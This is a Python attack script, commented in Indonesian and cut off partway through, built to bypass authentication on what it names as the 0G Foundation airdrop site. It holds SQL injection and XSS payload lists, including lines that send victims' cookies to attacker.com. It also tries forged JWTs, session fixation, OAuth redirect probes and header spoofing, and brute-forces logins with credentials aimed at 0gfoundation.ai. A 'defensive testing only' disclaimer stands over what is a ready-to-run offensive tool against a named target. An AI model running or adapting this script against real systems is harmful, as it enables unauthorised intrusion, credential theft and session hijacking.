#!/usr/bin/env python3
"""
Advanced Authentication Bypass untuk 0G Foundation Airdrop
Menggunakan berbagai teknik untuk melewati autentikasi dan mendapatkan akses ke sistem
HANYA UNTUK TUJUAN PENGETESAN KEAMANAN DEFENSIF
"""

import asyncio
import json
import re
import time
import base64
import hashlib
import random
import string
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import aiohttp
import requests

class AdvancedAuthenticationBypass:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.discovered_endpoints = []
        self.valid_credentials = []
        self.session_tokens = []
        self.vulnerabilities_found = []
        self.access_gained = False

    async def execute_bypass(self):
        """Eksekusi bypass autentikasi lengkap"""
        print("🔐 Advanced Authentication Bypass")
        print("=" * 60)
        print(f"🎯 Target: {self.target_url}")
        print("=" * 60)
        print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 60)

        try:
            # Fase 1: Discovery and Enumeration
            await self.discovery_phase()

            # Fase 2: Authentication Bypass Techniques
            await self.bypass_phase()

            # Fase 3: Session Hijacking
            await self.session_hijacking_phase()

            # Fase 4: Credential Extraction
            await self.credential_extraction_phase()

            # Fase 5: Access Verification
            await self.access_verification_phase()

            # Generate report
            await self.generate_bypass_report()

            if self.access_gained:
                print("✅ Authentication bypass successful!")
                print(f"📊 Valid credentials found: {len(self.valid_credentials)}")
                print(f"🔑 Session tokens obtained: {len(self.session_tokens)}")
            else:
                print("❌ Authentication bypass failed")

        except Exception as e:
            print(f"❌ Error during bypass: {str(e)}")

    async def discovery_phase(self):
        """Fase 1: Discovery endpoints dan informasi sistem"""
        print("\n🕵️ Phase 1: Discovery and Enumeration")
        print("-" * 50)

        # Basic endpoints to test
        endpoints = [
            "/login", "/admin", "/dashboard", "/api/login", "/auth/login",
            "/signin", "/sign-in", "/authenticate", "/verify", "/oauth",
            "/auth", "/user", "/profile", "/account", "/settings",
            "/api/auth", "/api/user", "/api/session", "/api/token",
            "/wp-admin", "/phpmyadmin", "/admin/login", "/cpanel"
        ]

        # Headers untuk mimicking real browser
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }

        for endpoint in endpoints:
            try:
                url = urljoin(self.target_url, endpoint)
                response = self.session.get(url, headers=headers, timeout=10, allow_redirects=True)

                if response.status_code == 200:
                    self.discovered_endpoints.append({
                        "endpoint": endpoint,
                        "status_code": response.status_code,
                        "content_length": len(response.content),
                        "title": self.extract_title(response.text),
                        "forms": self.extract_forms(response.text)
                    })
                    print(f"✅ Found: {endpoint} ({response.status_code})")

                    # Cari form login
                    if 'login' in endpoint.lower() or 'auth' in endpoint.lower():
                        await self.analyze_login_page(response.text, endpoint)

            except Exception as e:
                print(f"❌ Error testing {endpoint}: {str(e)}")
                continue

        print(f"\n📊 Discovered endpoints: {len(self.discovered_endpoints)}")

    async def analyze_login_page(self, content: str, endpoint: str):
        """Analisis halaman login untuk mencari kerentanan"""
        # Cari pola SQL injection
        sql_patterns = [
            r"SELECT\s+.*\s+FROM\s+users",
            r"SELECT\s+.*\s+FROM\s+auth",
            r"SELECT\s+.*\s+FROM\s+login",
            r"WHERE\s+username\s*=\s*['\"]?\s*\$.*",
            r"WHERE\s+password\s*=\s*['\"]?\s*\$.*",
        ]

        for pattern in sql_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                self.vulnerabilities_found.append({
                    "type": "SQL Injection Pattern",
                    "endpoint": endpoint,
                    "severity": "High",
                    "description": f"SQL injection pattern found in login form: {pattern}"
                })
                print(f"🚨 SQL injection pattern found in {endpoint}")

        # Cari error handling yang buruk
        error_patterns = [
            r"mysql_fetch_array",
            r"mysql_num_rows",
            r"Warning:\s+mysql",
            r"Fatal error:\s+mysql",
            r"Parse error:\s+syntax",
        ]

        for pattern in error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                self.vulnerabilities_found.append({
                    "type": "Poor Error Handling",
                    "endpoint": endpoint,
                    "severity": "Medium",
                    "description": f"Database error exposure found: {pattern}"
                })
                print(f"⚠️ Poor error handling in {endpoint}")

    def extract_title(self, content: str) -> str:
        """Extract title from HTML content"""
        title_match = re.search(r'<title[^>]*>(.*?)</title>', content, re.IGNORECASE | re.DOTALL)
        return title_match.group(1).strip() if title_match else "No Title"

    def extract_forms(self, content: str) -> List[Dict]:
        """Extract forms from HTML content"""
        forms = []
        form_pattern = r'<form[^>]*>(.*?)</form>'
        form_matches = re.findall(form_pattern, content, re.IGNORECASE | re.DOTALL)

        for form_html in form_matches:
            form_data = {
                "action": self.extract_form_attribute(form_html, "action"),
                "method": self.extract_form_attribute(form_html, "method", "GET"),
                "inputs": self.extract_inputs(form_html)
            }
            forms.append(form_data)

        return forms

    def extract_form_attribute(self, form_html: str, attr: str, default: str = "") -> str:
        """Extract specific attribute from form"""
        attr_pattern = f'{attr}=[\'"]([^\'"]*)[\'"]'
        match = re.search(attr_pattern, form_html, re.IGNORECASE)
        return match.group(1) if match else default

    def extract_inputs(self, form_html: str) -> List[Dict]:
        """Extract input fields from form"""
        inputs = []
        input_pattern = r'<input[^>]*>'
        input_matches = re.findall(input_pattern, form_html, re.IGNORECASE)

        for input_html in input_matches:
            input_data = {
                "name": self.extract_form_attribute(input_html, "name"),
                "type": self.extract_form_attribute(input_html, "type", "text"),
                "value": self.extract_form_attribute(input_html, "value", "")
            }
            if input_data["name"]:
                inputs.append(input_data)

        return inputs

    async def bypass_phase(self):
        """Fase 2: Authentication Bypass Techniques"""
        print("\n🔓 Phase 2: Authentication Bypass Techniques")
        print("-" * 50)

        # SQL Injection Bypass
        await self.sql_injection_bypass()

        # XSS Bypass
        await self.xss_bypass()

        # Session Fixation
        await self.session_fixation_bypass()

        # JWT Token Manipulation
        await self.jwt_manipulation_bypass()

        # OAuth Bypass
        await self.oauth_bypass()

    async def sql_injection_bypass(self):
        """SQL Injection bypass techniques"""
        print("\n🔍 SQL Injection Bypass")

        sql_payloads = [
            # Union-based injection
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "' OR '1'='1'#",
            "' OR '1'='1'; --",

            # Boolean-based injection
            "' AND 1=1 --",
            "' AND 1=0 --",

            # Error-based injection
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
            "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1) --",

            # Time-based injection
            "' AND SLEEP(5) --",
            "' AND BENCHMARK(5000000, SHA1('test')) --",

            # Advanced bypass techniques
            "' OR (SELECT COUNT(*) FROM users) > 0 --",
            "' OR (SELECT COUNT(*) FROM admin) > 0 --",
            "' UNION SELECT NULL, NULL, NULL --",
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT username, password, NULL FROM users --",

            # Login form specific
            "admin' --",
            "' OR 'a'='a",
            "1' OR '1'='1",
            "' OR 1=1#",
            "admin' #",

            # Alternative syntax
            "'/**/OR/**/'1'='1'/**/--",
            "'%20OR%201%3D1",
            "'/*comment*/OR/*comment*/1=1/*comment*/--",

            # MySQL specific
            "' OR (SELECT IF(1=1, SLEEP(5), 0)) --",
            "' OR (SELECT IF(SUBSTRING(current_user,1,1)='a', SLEEP(5), 0)) --",

            # PostgreSQL specific
            "' OR (SELECT pg_sleep(5)) --",
            "' OR (SELECT version()) > 0 --",

            # SQL Server specific
            "' OR 1=(SELECT @@version) --",
            "' OR 1=(SELECT COUNT(*) FROM sysobjects) --"
        ]

        # Test against discovered login endpoints
        for endpoint_data in self.discovered_endpoints:
            if "login" in endpoint_data["endpoint"].lower() or "auth" in endpoint_data["endpoint"].lower():
                await self.test_sql_injection(endpoint_data, sql_payloads)

    async def test_sql_injection(self, endpoint_data: Dict, sql_payloads: List[str]):
        """Test SQL injection against endpoint"""
        endpoint = endpoint_data["endpoint"]
        forms = endpoint_data.get("forms", [])

        for form in forms:
            if form["method"].upper() == "POST":
                # Test each SQL injection payload
                for payload in sql_payloads:
                    try:
                        # Prepare form data
                        form_data = {}
                        for input_field in form["inputs"]:
                            field_name = input_field["name"]
                            if "user" in field_name.lower() or "login" in field_name.lower() or "email" in field_name.lower():
                                form_data[field_name] = payload
                            elif "pass" in field_name.lower():
                                form_data[field_name] = "password"  # Dummy password
                            else:
                                form_data[field_name] = "test"

                        # Make request
                        url = urljoin(self.target_url, form["action"] or endpoint)
                        response = self.session.post(url, data=form_data, timeout=10)

                        # Check for indicators of successful injection
                        if self.detect_sql_injection_success(response):
                            self.vulnerabilities_found.append({
                                "type": "SQL Injection Vulnerability",
                                "endpoint": endpoint,
                                "payload": payload,
                                "severity": "Critical",
                                "description": f"SQL injection successful with payload: {payload}"
                            })
                            print(f"🚨 SQL injection successful at {endpoint} with payload: {payload[:50]}...")

                            # Try to extract data
                            await self.extract_data_via_sql_injection(endpoint, form, payload)

                    except Exception as e:
                        continue

    def detect_sql_injection_success(self, response) -> bool:
        """Detect if SQL injection was successful"""
        content = response.text.lower()
        success_indicators = [
            "welcome", "dashboard", "admin", "success", "logged in", "authenticated",
            "session", "token", "api_key", "user profile", "my account"
        ]

        error_indicators = [
            "sql syntax", "mysql_fetch", "mysql_num", "you have an error",
            "warning: mysql", "fatal error", "syntax error", "ora-00933",
            "unclosed quotation", "unclosed quote", "mysql_fetch_array"
        ]

        # Check for positive indicators (might indicate successful login)
        for indicator in success_indicators:
            if indicator in content:
                return True

        # Check for database error indicators (might indicate successful injection)
        for indicator in error_indicators:
            if indicator in content:
                return True

        return False

    async def extract_data_via_sql_injection(self, endpoint: str, form: Dict, payload: str):
        """Extract sensitive data via SQL injection"""
        print(f"🔍 Attempting data extraction at {endpoint}")

        # Try to extract database information
        extract_payloads = [
            f"' UNION SELECT 1,database(),3 --",
            f"' UNION SELECT 1,version(),3 --",
            f"' UNION SELECT 1,user(),3 --",
            f"' UNION SELECT table_name,column_name FROM information_schema.columns --"
        ]

        for extract_payload in extract_payloads:
            try:
                form_data = {}
                for input_field in form["inputs"]:
                    field_name = input_field["name"]
                    if "user" in field_name.lower() or "login" in field_name.lower():
                        form_data[field_name] = extract_payload
                    elif "pass" in field_name.lower():
                        form_data[field_name] = "password"
                    else:
                        form_data[field_name] = "test"

                url = urljoin(self.target_url, form["action"] or endpoint)
                response = self.session.post(url, data=form_data, timeout=10)

                # Look for database information in response
                if self.extract_database_info(response.text):
                    print(f"📄 Extracted database information from {endpoint}")

            except Exception:
                continue

    def extract_database_info(self, content: str) -> bool:
        """Extract database information from response"""
        db_patterns = [
            r'database\s*[=:]\s*[\'"]([^\'"]+)[\'"]',
            r'version\s*[=:]\s*[\'"]([^\'"]+)[\'"]',
            r'mysql\s+([0-9]+\.[0-9]+\.[0-9]+)',
            r'postgresql\s+([0-9]+\.[0-9]+\.[0-9]+)',
            r'microsoft\s+sql\s+server',
            r'oracle\s+[0-9]+'
        ]

        for pattern in db_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True

        return False

    async def xss_bypass(self):
        """XSS bypass techniques for session hijacking"""
        print("\n🕷️ XSS Bypass")

        xss_payloads = [
            # Basic XSS
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            "'><script>alert(XSS)</script>",

            # Advanced XSS
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src=javascript:alert("XSS")>',
            '<body onload=alert("XSS")>',

            # Encoded XSS
            '<script&#x3E;alert("XSS")</script&#x3E;',
            '%3Cscript%3Ealert("XSS")%3C/script%3E',
            '&#60;script&#62;alert("XSS")&#60;/script&#62;',

            # DOM-based XSS
            '<input autofocus onfocus=alert("XSS")>',
            '<select autofocus onfocus=alert("XSS")>',
            '<textarea autofocus onfocus=alert("XSS")>',

            # Event handler XSS
            '<div onclick=alert("XSS")>Click me</div>',
            '<div onmouseover=alert("XSS")>Hover me</div>',
            '<div onerror=alert("XSS")><img src=></div>',

            # String-based XSS
            '";alert("XSS");"',
            '"\\\'alert("XSS")\\\'',
            "'\\\");alert('XSS');'",

            # Context-aware XSS
            '<a href="javascript:alert(\'XSS\')">Click</a>',
            '<body background="javascript:alert(\'XSS\')">',
            '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
            '<a href="javascript:alert(\'XSS\')">Link</a>',

            # Bypass filters
            '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
            '<scr<iframe>ipt>alert("XSS")</ifr</iframe>ame>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>alert(/XSS/)</script>',
            '<script>alert(String.fromCharCode(120,115,115))</script>',

            # Cookie stealing
            '<script>fetch("//attacker.com/steal?cookie="+document.cookie)</script>',
            '<script>new Image().src="//attacker.com/steal?cookie="+document.cookie</script>',
            '<script>document.write("<img src=//attacker.com/steal?cookie="+document.cookie+">")</script>',

            # Session hijacking
            '<script>document.location="http://attacker.com/hijack?session="+document.cookie</script>',
            '<script>window.location="http://attacker.com/steal?cookie="+document.cookie</script>'
        ]

        # Test XSS on login forms
        for endpoint_data in self.discovered_endpoints:
            if "login" in endpoint_data["endpoint"].lower():
                await self.test_xss_injection(endpoint_data, xss_payloads)

    async def test_xss_injection(self, endpoint_data: Dict, xss_payloads: List[str]):
        """Test XSS injection against endpoint"""
        endpoint = endpoint_data["endpoint"]
        forms = endpoint_data.get("forms", [])

        for form in forms:
            if form["method"].upper() == "POST":
                for payload in xss_payloads:
                    try:
                        form_data = {}
                        for input_field in form["inputs"]:
                            field_name = input_field["name"]
                            if any(keyword in field_name.lower() for keyword in ["user", "login", "email", "name"]):
                                form_data[field_name] = payload
                            elif "pass" in field_name.lower():
                                form_data[field_name] = "password"
                            else:
                                form_data[field_name] = "test"

                        url = urljoin(self.target_url, form["action"] or endpoint)
                        response = self.session.post(url, data=form_data, timeout=10)

                        if self.detect_xss_success(response, payload):
                            self.vulnerabilities_found.append({
                                "type": "XSS Vulnerability",
                                "endpoint": endpoint,
                                "payload": payload,
                                "severity": "High",
                                "description": f"XSS vulnerability found: {payload}"
                            })
                            print(f"🚨 XSS vulnerability found at {endpoint}")

                    except Exception:
                        continue

    def detect_xss_success(self, response, payload: str) -> bool:
        """Detect if XSS was successful"""
        content = response.text.lower()

        # Check if payload is reflected in response
        if payload.lower().replace(' ', '').replace('\n', '') in content.replace(' ', '').replace('\n', ''):
            return True

        # Check for common XSS indicators
        xss_indicators = ['<script>', 'javascript:', 'onerror=', 'onload=', 'onclick=']

        for indicator in xss_indicators:
            if indicator.lower() in content:
                return True

        return False

    async def session_fixation_bypass(self):
        """Session fixation attack"""
        print("\n🔄 Session Fixation Attack")

        # Get session cookie from initial request
        initial_response = self.session.get(self.target_url)
        initial_cookies = initial_response.cookies

        if initial_cookies:
            print(f"📋 Initial cookies: {len(initial_cookies)} found")

            # Try session fixation
            fixation_cookies = {}
            for cookie in initial_cookies:
                fixation_cookies[cookie.name] = cookie.value

            # Try to manipulate session ID
            for cookie_name in fixation_cookies:
                original_value = fixation_cookies[cookie_name]

                # Try common session fixation values
                fixation_values = [
                    "admin",
                    "administrator",
                    "root",
                    "test",
                    "123456",
                    "1",
                    "' OR '1'='1",
                    "1' OR '1'='1",
                    "admin' --",
                    "1' OR 1=1--"
                ]

                for fix_value in fixation_values:
                    try:
                        test_cookies = fixation_cookies.copy()
                        test_cookies[cookie_name] = fix_value

                        response = self.session.get(self.target_url, cookies=test_cookies)

                        if self.detect_session_fixation_success(response):
                            self.vulnerabilities_found.append({
                                "type": "Session Fixation Vulnerability",
                                "endpoint": "/",
                                "cookie": cookie_name,
                                "value": fix_value,
                                "severity": "High",
                                "description": f"Session fixation successful with cookie {cookie_name}={fix_value}"
                            })
                            print(f"🚨 Session fixation successful with {cookie_name}={fix_value}")

                    except Exception:
                        continue

    def detect_session_fixation_success(self, response) -> bool:
        """Detect if session fixation was successful"""
        content = response.text.lower()

        # Look for admin or privileged access indicators
        admin_indicators = ['admin panel', 'dashboard', 'welcome admin', 'administrator']
        success_indicators = ['welcome', 'dashboard', 'profile', 'account', 'settings']

        for indicator in admin_indicators + success_indicators:
            if indicator in content:
                return True

        return False

    async def jwt_manipulation_bypass(self):
        """JWT token manipulation"""
        print("\n🎭 JWT Token Manipulation")

        # Test JWT bypass techniques
        jwt_payloads = [
            # Base64 encoded payloads
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9",  # admin admin
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AZXhhbXBsZS5jb20ifQ",  # admin email
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4ifQ",  # admin role

            # Empty/invalid tokens
            "",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",

            # Modified admin tokens
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.abc123",
            "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.abc123",
        ]

        # Look for JWT tokens in responses
        for endpoint_data in self.discovered_endpoints:
            if "auth" in endpoint_data["endpoint"].lower() or "login" in endpoint_data["endpoint"].lower():
                await self.test_jwt_manipulation(endpoint_data, jwt_payloads)

    async def test_jwt_manipulation(self, endpoint_data: Dict, jwt_payloads: List[str]):
        """Test JWT token manipulation"""
        endpoint = endpoint_data["endpoint"]
        forms = endpoint_data.get("forms", [])

        for form in forms:
            if form["method"].upper() == "POST":
                for jwt_payload in jwt_payloads:
                    try:
                        form_data = {}
                        for input_field in form["inputs"]:
                            field_name = input_field["name"]
                            if "token" in field_name.lower():
                                form_data[field_name] = jwt_payload
                            elif any(keyword in field_name.lower() for keyword in ["user", "login", "email"]):
                                form_data[field_name] = "admin"
                            elif "pass" in field_name.lower():
                                form_data[field_name] = "admin"
                            else:
                                form_data[field_name] = "test"

                        url = urljoin(self.target_url, form["action"] or endpoint)
                        response = self.session.post(url, data=form_data, timeout=10)

                        if self.detect_jwt_success(response):
                            self.vulnerabilities_found.append({
                                "type": "JWT Token Vulnerability",
                                "endpoint": endpoint,
                                "payload": jwt_payload,
                                "severity": "High",
                                "description": f"JWT manipulation successful: {jwt_payload}"
                            })
                            print(f"🚨 JWT manipulation successful at {endpoint}")

                    except Exception:
                        continue

    def detect_jwt_success(self, response) -> bool:
        """Detect if JWT manipulation was successful"""
        content = response.text.lower()

        # Check for admin access indicators
        admin_indicators = ['admin panel', 'dashboard', 'administrator', 'welcome admin']
        success_indicators = ['welcome', 'dashboard', 'profile', 'authenticated', 'success']

        for indicator in admin_indicators + success_indicators:
            if indicator in content:
                return True

        # Check for JWT tokens in response headers
        if 'set-cookie' in response.headers:
            cookies = response.headers['set-cookie']
            if any(jwt_indicator in cookies.lower() for jwt_indicator in ['jwt', 'token', 'auth']):
                return True

        return False

    async def oauth_bypass(self):
        """OAuth bypass techniques"""
        print("\n🔐 OAuth Bypass")

        # Test OAuth vulnerability patterns
        oauth_payloads = [
            # Open redirect
            "http://evil.com",
            "javascript:evil.com",
            "//evil.com",
            "/\\evil.com",

            # CSRF bypass
            "state=malicious",
            "redirect_uri=evil.com",
            "client_id=evil",

            # Token manipulation
            "code=malicious_code",
            "access_token=stolen_token",
            "refresh_token=stolen_refresh",

            # Header manipulation
            "Host: evil.com",
            "X-Forwarded-For: 127.0.0.1",
            "X-Forwarded-Host: localhost"
        ]

        # Test against OAuth endpoints
        for endpoint_data in self.discovered_endpoints:
            if "oauth" in endpoint_data["endpoint"].lower():
                await self.test_oauth_vulnerabilities(endpoint_data, oauth_payloads)

    async def test_oauth_vulnerabilities(self, endpoint_data: Dict, oauth_payloads: List[str]):
        """Test OAuth vulnerabilities"""
        endpoint = endpoint_data["endpoint"]

        for payload in oauth_payloads:
            try:
                # Test as query parameter
                url = urljoin(self.target_url, endpoint) + "?" + urlencode({"param": payload})
                response = self.session.get(url, timeout=10)

                if self.detect_oauth_success(response, payload):
                    self.vulnerabilities_found.append({
                        "type": "OAuth Vulnerability",
                        "endpoint": endpoint,
                        "payload": payload,
                        "severity": "High",
                        "description": f"OAuth vulnerability: {payload}"
                    })
                    print(f"🚨 OAuth vulnerability found at {endpoint}")

            except Exception:
                continue

    def detect_oauth_success(self, response, payload: str) -> bool:
        """Detect if OAuth bypass was successful"""
        content = response.text.lower()

        # Check for error messages that might indicate successful bypass
        error_indicators = ['invalid', 'error', 'failed', 'unauthorized']
        success_indicators = ['welcome', 'success', 'redirect', 'callback']

        # Look for both error and success patterns
        for indicator in error_indicators + success_indicators:
            if indicator in content:
                return True

        return False

    async def session_hijacking_phase(self):
        """Fase 3: Session Hijacking"""
        print("\n🔄 Phase 3: Session Hijacking")
        print("-" * 50)

        # Session token extraction
        await self.session_token_extraction()

        # Cookie manipulation
        await self.cookie_manipulation()

        # Header injection
        await self.header_injection()

    async def session_token_extraction(self):
        """Extract session tokens from responses"""
        print("\n🔑 Session Token Extraction")

        # Make initial requests to get session tokens
        endpoints = ["/", "/login", "/dashboard", "/admin"]

        for endpoint in endpoints:
            try:
                response = self.session.get(urljoin(self.target_url, endpoint))

                # Extract session cookies
                for cookie in response.cookies:
                    self.session_tokens.append({
                        "name": cookie.name,
                        "value": cookie.value,
                        "domain": cookie.domain,
                        "path": cookie.path,
                        "secure": cookie.secure,
                        "expires": cookie.expires
                    })

                # Check response headers for tokens
                if 'set-cookie' in response.headers:
                    cookie_header = response.headers['set-cookie']

                    # Look for session tokens in headers
                    session_patterns = [
                        r'session=([^;]+)',
                        r'sid=([^;]+)',
                        r'auth=([^;]+)',
                        r'token=([^;]+)',
                        r'sessid=([^;]+)',
                        r'jsessionid=([^;]+)'
                    ]

                    for pattern in session_patterns:
                        matches = re.findall(pattern, cookie_header, re.IGNORECASE)
                        for match in matches:
                            self.session_tokens.append({
                                "name": "extracted",
                                "value": match,
                                "source": f"header - {endpoint}",
                                "type": "session"
                            })

            except Exception:
                continue

        print(f"📊 Extracted session tokens: {len(self.session_tokens)}")

    async def cookie_manipulation(self):
        """Cookie manipulation for session hijacking"""
        print("\n🍪 Cookie Manipulation")

        # Test cookie manipulation techniques
        if self.session_tokens:
            for token in self.session_tokens[:5]:  # Test first 5 tokens
                await self.test_cookie_manipulation(token)

    async def test_cookie_manipulation(self, token: Dict):
        """Test cookie manipulation"""
        try:
            # Try common admin values
            admin_values = [
                "admin", "administrator", "root", "superuser", "1",
                "' OR '1'='1", "1' OR '1'='1", "admin' --"
            ]

            for admin_value in admin_values:
                # Create test cookies
                test_cookies = {token["name"]: admin_value}

                # Try to access protected endpoints
                endpoints = ["/admin", "/dashboard", "/settings"]

                for endpoint in endpoints:
                    try:
                        response = self.session.get(
                            urljoin(self.target_url, endpoint),
                            cookies=test_cookies,
                            timeout=10
                        )

                        if self.detect_admin_access(response):
                            self.vulnerabilities_found.append({
                                "type": "Cookie Manipulation",
                                "endpoint": endpoint,
                                "cookie": token["name"],
                                "value": admin_value,
                                "severity": "Critical",
                                "description": f"Admin access via cookie {token['name']}={admin_value}"
                            })
                            self.access_gained = True
                            self.valid_credentials.append({
                                "type": "cookie",
                                "name": token["name"],
                                "value": admin_value,
                                "endpoint": endpoint
                            })
                            print(f"🚨 Admin access via cookie: {token['name']}={admin_value} at {endpoint}")

                    except Exception:
                        continue

        except Exception:
            pass

    def detect_admin_access(self, response) -> bool:
        """Detect if admin access was gained"""
        content = response.text.lower()

        admin_indicators = [
            'admin panel', 'administrator', 'dashboard', 'control panel',
            'management', 'settings', 'configuration', 'system admin'
        ]

        for indicator in admin_indicators:
            if indicator in content:
                return True

        return False

    async def header_injection(self):
        """Header injection for session hijacking"""
        print("\n📋 Header Injection")

        # Test header manipulation
        headers_to_test = [
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Forwarded-Host", "localhost"),
            ("X-Remote-Addr", "127.0.0.1"),
            ("X-Remote-IP", "127.0.0.1"),
            ("X-Originating-IP", "127.0.0.1"),
            ("X-WAP-Profile", "http://localhost/ua_profile.xml"),
            ("Client-IP", "127.0.0.1"),
            ("True-Client-IP", "127.0.0.1")
        ]

        # Test each header combination
        for header_name, header_value in headers_to_test:
            try:
                headers = {"X-Requested-With": "XMLHttpRequest"}
                headers[header_name] = header_value

                response = self.session.get(self.target_url, headers=headers, timeout=10)

                # Look for local access indicators
                if self.detect_local_access(response):
                    self.vulnerabilities_found.append({
                        "type": "Header Injection",
                        "header": header_name,
                        "value": header_value,
                        "severity": "Medium",
                        "description": f"Header injection possible: {header_name}={header_value}"
                    })
                    print(f"⚠️ Header injection possible: {header_name}={header_value}")

            except Exception:
                continue

    def detect_local_access(self, response) -> bool:
        """Detect if local access was gained"""
        content = response.text.lower()

        local_indicators = ['localhost', '127.0.0.1', 'internal', 'admin', 'dashboard']

        for indicator in local_indicators:
            if indicator in content:
                return True

        return False

    async def credential_extraction_phase(self):
        """Fase 4: Credential Extraction"""
        print("\n🎯 Phase 4: Credential Extraction")
        print("-" * 50)

        # Brute force attack
        await self.brute_force_attack()

        # Credential stuffing
        await self.credential_stuffing()

        # Password spraying
        await self.password_spraying()

    async def brute_force_attack(self):
        """Brute force attack to find valid credentials"""
        print("\n🔓 Brute Force Attack")

        # Common usernames
        usernames = [
            "admin", "administrator", "root", "user", "test", "demo",
            "guest", "info", "support", "help", "contact", "webmaster",
            "admin@0gfoundation.ai", "administrator@0gfoundation.ai",
            "root@0gfoundation.ai", "user@0gfoundation.ai", "test@0gfoundation.ai",
            "demo@0gfoundation.ai", "guest@0gfoundation.ai", "info@0gfoundation.ai"
        ]

        # Common passwords
        passwords = [
            "admin", "password", "123456", "12345678", "123456789", "1234567890",
            "root", "user", "test", "demo", "guest", "password123", "admin123",
            "qwerty", "abc123", "letmein", "welcome", "monkey", "dragon",
            "password1", "admin123", "test123", "demo123", "guest123",
            "0gfoundation", "0g", "foundation", "airdrop", "crypto", "blockchain",
            "bitcoin", "ethereum", "wallet", "web3", "defi", "crypto123"
        ]

        # Test against login endpoints
        login_endpoints = [e for e in self.discovered_endpoints if "login" in e["endpoint"].lower()]

        if login_endpoints:
            for login_endpoint in login_endpoints[:2]:  # Test first 2 login endpoints
                await self.test_brute_force(login_endpoint, usernames, passwords)

    async def test_brute_force(self, endpoint_data: Dict, usernames: List[str], passwords: List[str]):
        """Test brute force attack"""
        endpoint = endpoint_data["endpoint"]
        forms = endpoint_data.get("forms", [])

        for form in forms:
            if form["method"].upper() == "POST":
                username_field = None
                password_field = None

                # Identify username and password fields
                for input_field in form["inputs"]:
                    field_name = input_field["name"].lower()
                    if any(keyword in field_name for keyword in ["user", "login", "email", "name"]):
                        username_field = input_field["name"]
                    elif "pass" in field_name:
                        password_field = input_field["name"]

                if username_field and password_field:
                    print(f"🔓 Testing brute force on {endpoint}")

                    # Test common username/password combinations
                    for username in usernames[:10]:  # Limit to avoid rate limiting
                        for password in passwords[:5]:  # Limit combinations
                            try:
                                form_data = {
                                    username_field: username,
                                    password_field: password
                                }

                                # Add any other fields with default values
                                for input_field in form["inputs"]:
                                    field_name = input_field["name"]
                                    if field_name not in [username_field, password_field]:
                                        form_data[field_name] = "test" if input_field["type"] != "checkbox" else "on"

                                url = urljoin(self.target_url, form["action"] or endpoint)
                                response = self.session.post(url, data=form_data, timeout=10)

                                if self.detect_successful_login(response):
                                    self.valid_credentials.append({
                                        "type": "brute_force",
                                        "username": username,
                                        "password": password,
                                        "endpoint": endpoint
                                    })
                                    self.access_gained = True
                                    print(f"🚨 Valid credentials found: {username}:{password} at {endpoint}")

                                    # Stop if we found valid credentials
                                    if len(self.valid_credentials) >= 3:
                                        return

                            except Exception:
                                continue

    def detect_successful_login(self, response) -> bool:
        """Detect if login was successful"""
        content = response.text.lower()

        # Check for successful login indicators
        success_indicators = [
            'welcome', 'dashboard', 'profile', 'account', 'settings',
            'admin panel', 'administrator', 'logged in', 'authenticated',
            'success', 'welcome back', 'my account', 'user profile'
        ]

        # Check for login failure indicators
        failure_indicators = [
            'invalid', 'incorrect', 'wrong', 'error', 'failed',
            'unauthorized', 'access denied', 'not authorized'
        ]

        # Success if success indicators found and no failure indicators
        has_success = any(indicator in content for indicator in success_indicators)
        has_failure = any(indicator in content for indicator in failure_indicators)

        return has_success and not has_failure

    async def credential_stuffing(self):
        """Credential stuffing attack"""
        print("\n📋 Credential Stuffing")

        # Common credential pairs
        credential_pairs = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("administrator", "administrator"),
            ("administrator", "password"),
